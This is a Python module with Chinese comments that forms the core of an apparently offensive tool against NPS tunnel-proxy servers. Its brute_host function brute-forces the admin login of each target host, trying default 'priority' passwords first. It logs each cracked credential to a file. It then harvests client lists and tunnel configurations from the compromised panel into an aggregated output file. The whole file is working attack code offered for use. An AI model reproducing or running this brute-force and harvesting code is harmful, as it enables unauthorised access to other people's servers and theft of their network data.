# -*- coding: utf-8 -*-
# 核心逻辑模块 - 包含对单个目标主机执行暴力破解、获取数据和处理结果的核心函数。

import requests # 导入 requests 库，用于发送网络请求
import time     # 导入 time 模块，用于处理延时
import sys      # 导入 sys 模块，用于打印到标准错误或标准输出
import os       # 导入 os 模块，用于文件路径操作
import json     # 导入 json 模块，用于处理 JSON 数据
from threading import Lock # 导入 Lock 类，用于线程同步，确保文件写入安全

# 导入自定义模块 (已修改为绝对导入)
from nps_auth import try_password # 从认证模块导入尝试密码函数
# 导入数据获取和格式化函数 (format_tunnel_data 现在返回列表)
from nps_data import get_nps_client_data, get_nps_tunnel_data, format_tunnel_data
# Import constants needed here
from nps_constants import DEFAULT_AGGREGATED_TUNNELS_FILE


# 定义 DummyPbar 类 - 当不使用 tqdm 库时，提供一个具有 write 方法的模拟进度条对象，以兼容代码。
class DummyPbar:
    """A dummy progress bar that prints messages directly."""
    def write(self, msg, file=None):
        # 在单目标详细模式下，直接使用 print 打印信息
        print(msg, file=file if file is not None else sys.stdout)
    def update(self, n=1): # Add default n=1
        pass # Dummy 对象不执行更新操作
    def __enter__(self):
        return self # 支持 with 语句上下文管理
    def __exit__(self, exc_type, exc_val, exc_tb):
        pass # 支持 with 语句上下文管理


def brute_host(host, username, passwords, out_fp, lock, delay, verbose, pbar, max_failures_per_host, get_clients, save_data, get_tunnels, client_api_path, tunnel_api_path, tunnel_page_limit, priority_passwords_set, tunnel_fp=None, tunnel_lock=None):
    """
    对单个目标主机进行暴力破解，尝试密码列表中的密码。
    如果成功登录，可选地获取客户端和隧道数据。
    函数会优先尝试在 nps_constants 中定义的优先密码。
    增加网络错误或超时次数计数，达到阈值后跳过该主机的剩余密码尝试。
    将获取到的隧道数据（如果启用了获取和保存）写入到公共聚合文件中，
    现在能处理一个隧道条目对应多个凭证的情况。

    Args:
        host (str): 目标主机的地址 (格式: host:port)。
        username (str): 尝试登录的用户名。
        passwords (list): 包含要尝试的密码字符串的列表 (priority first).
        out_fp (file): 用于写入成功账号密码的文件的文件句柄。
        lock (threading.Lock): 用于保护成功账号密码文件写入的线程锁。
        delay (float): 每次密码尝试之间的延时（秒）。
        verbose (bool): 是否启用详细输出模式。
        pbar (tqdm.Tqdm or DummyPbar): 进度条对象，用于安全打印信息。
        max_failures_per_host (int): 对同一主机允许的最大网络错误或超时次数。
        get_clients (bool): 是否在成功登录后获取客户端数据。
        save_data (bool): 是否保存获取到的数据。
        get_tunnels (bool): 是否在成功登录后获取隧道数据。
        client_api_path (str): API path for client data.
        tunnel_api_path (str): API path for tunnel data.
        tunnel_page_limit (int): Page size for tunnel data fetching.
        priority_passwords_set (set): Set of priority passwords.
        tunnel_fp (file, optional): 隧道数据聚合文件的文件句柄。如果需要聚合保存隧道数据，则传入此参数。默认为 None。
        tunnel_lock (threading.Lock, optional): 用于保护隧道数据聚合文件写入的线程锁。如果需要聚合保存隧道数据，则传入此参数。默认为 None。

    Returns:
        tuple: 返回一个包含三个布尔值的元组 (found_success, got_client_data, wrote_tunnel_data)。
               - found_success: 是否成功登录了该主机。
               - got_client_data: 是否成功获取到了非空的客户端数据列表 (仅在 -C 启用且获取到数据时为 True)。
               - wrote_tunnel_data: 是否成功获取到了非空的隧道数据 *并写入了至少一行* (仅在 -T/-S 启用且实际写入时为 True)。
    """
    found_success = False # 标志，指示是否找到了成功的密码
    network_failure_count = 0 # 计数器，记录当前主机遇到的网络错误或超时次数
    got_client_data_flag = False # 标志，指示是否成功获取了客户端数据
    wrote_tunnel_data_flag = False # 标志，指示是否成功获取并写入了至少一行隧道数据

    output_func = pbar.write if pbar else print # 选择输出函数

    # --- 内部函数：处理隧道数据获取和写入 ---
    def process_tunnel_data(session, host, scheme, username, password):
        nonlocal wrote_tunnel_data_flag # 允许修改外部函数的标志
        tunnels_written_count = 0 # 记录为当前主机写入的隧道行数

        if not get_tunnels: # 如果未指定 -T，则直接返回
             if verbose and not get_clients: # 仅在未获取客户端时打印跳过信息
                 output_func(f"[*] {host} 登录成功 ({username}/{password})，但已跳过隧道数据获取 (未指定 -T)。", file=sys.stdout)
             return

        # 调用 nps_data.get_nps_tunnel_data 获取隧道数据列表
        # Pass API path and page limit
        tunnels_list = get_nps_tunnel_data(session, host, scheme, username, password, tunnel_api_path, tunnel_page_limit, verbose, pbar)

        if not tunnels_list: # 如果未获取到隧道列表
             if verbose:
                 output_func(f"[*] {host} 未获取到隧道列表数据或获取失败。", file=sys.stdout)
             return # 直接返回

        # 如果获取到隧道数据列表，并且启用了保存数据 (-S) 且提供了隧道文件句柄和锁
        # Use the specific aggregated file name from args if available, else default
        aggregated_file = tunnel_fp.name if tunnel_fp else DEFAULT_AGGREGATED_TUNNELS_FILE
        if save_data and tunnel_fp and tunnel_lock:
            try:
                host_ip = host.split(':')[0] # 提取目标主机的 IP 地址部分
                lines_to_write = [] # 存储所有需要写入的行

                if verbose:
                    output_func(f"[*] {host} 获取到 {len(tunnels_list)} 条原始隧道条目，正在处理并准备写入聚合文件...")

                # 遍历获取到的原始隧道数据列表
                for tunnel in tunnels_list:
                    # 调用 format_tunnel_data 函数格式化单个隧道条目
                    # !!! 注意：现在 format_tunnel_data 返回一个列表 !!!
                    formatted_tunnel_lines = format_tunnel_data(tunnel, host_ip, verbose, pbar)
                    if formatted_tunnel_lines:
                        # 将返回列表中的所有行添加到待写入列表
                        lines_to_write.extend(formatted_tunnel_lines)

                # 如果有需要写入的行
                if lines_to_write:
                    # 使用隧道文件写入锁，确保多线程写入聚合文件时的安全
                    with tunnel_lock:
                        # 遍历待写入的行列表
                        for line_to_write in lines_to_write:
                            tunnel_fp.write(line_to_write + "\n") # 写入文件，每行一个隧道信息
                        tunnel_fp.flush() # 立即刷新缓冲区，确保数据写入磁盘
                    tunnels_written_count = len(lines_to_write) # 更新写入的行数
                    wrote_tunnel_data_flag = True # 标记成功写入了隧道数据

                    if verbose: # 如果在详细模式下
                        output_func(f"[✔] {host} 的 {tunnels_written_count} 行隧道数据已写入聚合文件 {aggregated_file}", file=sys.stdout)
                elif verbose: # 如果没有需要写入的行
                    output_func(f"[*] {host} 未从获取到的 {len(tunnels_list)} 条原始条目中解析出有效的隧道数据写入聚合文件。", file=sys.stdout)

            except Exception as e: # 捕获写入聚合文件时可能发生的异常
                if verbose: # 在详细模式下打印写入文件失败的错误信息
                    output_func(f"[-] 错误：写入 {host} 的隧道数据到聚合文件 {aggregated_file} 失败: {e}", file=sys.stderr)
        elif verbose: # 如果未启用保存 (-S) 或未提供文件句柄/锁
             output_func(f"[*] {host} 获取到 {len(tunnels_list)} 条原始隧道条目，但未启用保存 (-S) 或文件写入设置不完整，数据未写入文件。", file=sys.stdout)

    # --- 内部函数：处理客户端数据获取 ---
    def process_client_data(session, host, scheme, username, password):
        nonlocal got_client_data_flag # 允许修改外部函数的标志

        if not get_clients: # 如果未指定 -C，则直接返回
             if verbose and not get_tunnels: # 仅在未获取隧道时打印跳过信息
                 output_func(f"[*] {host} 登录成功 ({username}/{password})，但已跳过客户端数据获取 (未指定 -C)。", file=sys.stdout)
             return

        # 调用 nps_data.get_nps_client_data 获取客户端数据
        # Pass the API path
        client_data = get_nps_client_data(session, host, scheme, username, password, client_api_path, verbose, pbar, save_data)
        # 检查是否成功获取并解析了客户端数据，并且客户端列表非空
        if client_data is not None and client_data.get("rows"):
            got_client_data_flag = True # 标记成功获取了客户端数据
        elif verbose: # 如果未获取到数据或列表为空
             output_func(f"[*] {host} 未获取到客户端列表数据或列表为空。", file=sys.stdout)

    # --- 主要暴力破解逻辑 ---
    with requests.Session() as session:
        # Passwords list already has priority passwords first from load_passwords
        if verbose:
            priority_count = len(priority_passwords_set)
            total_count = len(passwords)
            output_func(f"[*] {host} 开始尝试 {total_count} 个密码 (优先: {priority_count}, 其余: {total_count - priority_count})...")

        for pwd in passwords: # Iterate through the prepared list
            if found_success: break # 如果已找到密码，停止尝试
            if network_failure_count >= max_failures_per_host: break # Stop if max failures reached

            # 调用 nps_auth.try_password 函数尝试登录
            success, scheme, status = try_password(session, host, username, pwd, verbose, pbar)

            if status.startswith("network_"): # 如果尝试结果是网络相关的错误
                network_failure_count += 1 # 增加网络错误计数
                if verbose:
                    error_type = status.replace('network_', '').replace('_', ' ')
                    output_func(f"[*] {host} 尝试 {username}/{pwd} 时发生网络错误 ({error_type})，计数: {network_failure_count}/{max_failures_per_host}", file=sys.stderr)
                if network_failure_count >= max_failures_per_host: # 如果网络错误次数达到或超过阈值
                    if verbose:
                        output_func(f"[!] {host} 网络错误或超时次数 ({network_failure_count}) 已达到阈值 ({max_failures_per_host})，跳过剩余密码尝试。", file=sys.stderr)
                    # No need to break here, loop condition will handle it

            elif status == "success": # 如果成功登录
                base = f"{scheme}://{host}" # 构建成功登录的基础 URL
                line = f"{base} -> {username}={pwd}\n" # 构建成功信息行
                output_func(f"[✔] {base} NPS 登录成功，密码：{pwd}") # 使用 pbar.write 打印成功信息
                with lock: # 使用成功账号文件写入锁
                    out_fp.write(line) # 将成功信息写入文件
                    out_fp.flush() # 立即刷新缓冲区
                found_success = True # 标记已找到成功密码

                # ***** 在成功登录后，调用内部函数处理额外数据 *****
                process_client_data(session, host, scheme, username, pwd)
                process_tunnel_data(session, host, scheme, username, pwd)
                # *************************************************

                # 如果启用了 verbose 但没有获取客户端和隧道数据
                if verbose and not get_clients and not get_tunnels:
                    output_func(f"[*] {host} 登录成功 ({username}/{pwd})，已跳过所有额外数据获取 (未指定 -C 和 -T)。", file=sys.stdout)

                # break # Found success, no need to try more passwords for this host

            # 每次尝试后根据用户指定的延时进行等待
            # Apply delay only if not stopping due to success or max failures
            if delay > 0 and not found_success and network_failure_count < max_failures_per_host:
                 time.sleep(delay)

    # --- 循环结束后 ---
    if not found_success and network_failure_count < max_failures_per_host:
        if verbose: # 在详细模式下打印所有密码尝试均失败的信息
            output_func(f"[✘] {host} 所有密码尝试完成，未发现成功登录。")
    # If skipped due to network errors, message was printed inside loop

    # 返回本次函数调用的结果状态
    return found_success, got_client_data_flag, wrote_tunnel_data_flag

